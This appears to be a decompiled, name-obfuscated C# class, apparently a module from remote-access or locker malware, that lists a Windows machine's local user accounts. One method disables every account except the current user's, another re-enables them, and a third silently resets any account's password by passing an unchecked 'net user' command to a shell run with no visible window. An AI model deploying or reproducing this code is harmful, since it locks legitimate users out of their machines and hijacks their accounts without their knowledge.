using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.DirectoryServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns4;

internal class Class17
{
	private static string string_0 = "success";

	private static string string_1 = "failed";

	private static string string_2 = "Can not found the specified user";

	private static string string_3 = "Can not found the specified group";

	private static List<string> list_0 = smethod_6(Environment.MachineName);

	public static void smethod_0(string username, string password)
	{
		Interaction.Shell("net user " + username + " " + password, (AppWinStyle)2, false, -1);
	}

	public static void smethod_1()
	{
		foreach (string item in list_0)
		{
			if (Operators.CompareString(item, Environment.UserName, false) != 0)
			{
				smethod_3(item, accountActive: false);
			}
		}
	}

	public static void smethod_2()
	{
		foreach (string item in list_0)
		{
			if (Operators.CompareString(item, Environment.UserName, false) != 0)
			{
				smethod_3(item, accountActive: true);
			}
		}
	}

	public unsafe static string smethod_3(string userIdentity, bool accountActive)
	{
		void* ptr = stackalloc byte[20];
		DirectoryEntry val = smethod_5();
		string message = string_1;
		if (val != null)
		{
			if (smethod_4(userIdentity))
			{
				try
				{
					DirectoryEntry val2 = val.get_Children().Find(userIdentity, "user");
					*(int*)((byte*)ptr + 4) = 512;
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 8) = 64;
					*(int*)ptr = 65536;
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4) | *(int*)ptr | *(int*)((byte*)ptr + 8);
					if (!accountActive)
					{
						*(int*)((byte*)ptr + 16) = 2;
						*(int*)((byte*)ptr + 12) |= *(int*)((byte*)ptr + 16);
					}
					val2.Invoke("Put", new object[2]
					{
						"userFlags",
						*(int*)((byte*)ptr + 12)
					});
					val2.CommitChanges();
					message = string_0;
					val2.Close();
					((Component)(object)val2).Dispose();
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					message = ex2.Message;
					ProjectData.ClearProjectError();
				}
			}
			else
			{
				message = string_2;
			}
		}
		val.Close();
		((Component)(object)val).Dispose();
		return message;
	}

	private unsafe static bool smethod_4(string userIdentity)
	{
		void* ptr = stackalloc byte[2];
		DirectoryEntry val = smethod_5();
		*(sbyte*)ptr = 0;
		if (val != null)
		{
			try
			{
				if (val.get_Children().Find(userIdentity, "user") != null)
				{
					*(sbyte*)ptr = 1;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				*(sbyte*)ptr = 0;
				ProjectData.ClearProjectError();
			}
		}
		val.Close();
		((Component)(object)val).Dispose();
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	private static DirectoryEntry smethod_5()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		DirectoryEntry val = null;
		try
		{
			string text = "WinNT://" + Environment.MachineName + ",computer";
			val = new DirectoryEntry(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			val = null;
			ProjectData.ClearProjectError();
		}
		return val;
	}

	public static List<string> smethod_6(string MachineName)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		DirectoryEntry val = new DirectoryEntry("WinNT://" + MachineName);
		List<string> list = new List<string>();
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val.get_Children().GetEnumerator();
			while (enumerator.MoveNext())
			{
				DirectoryEntry val2 = (DirectoryEntry)enumerator.Current;
				if (Operators.CompareString(val2.get_SchemaClassName(), "User", false) == 0)
				{
					list.Add(val2.get_Name());
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		return list;
	}
}
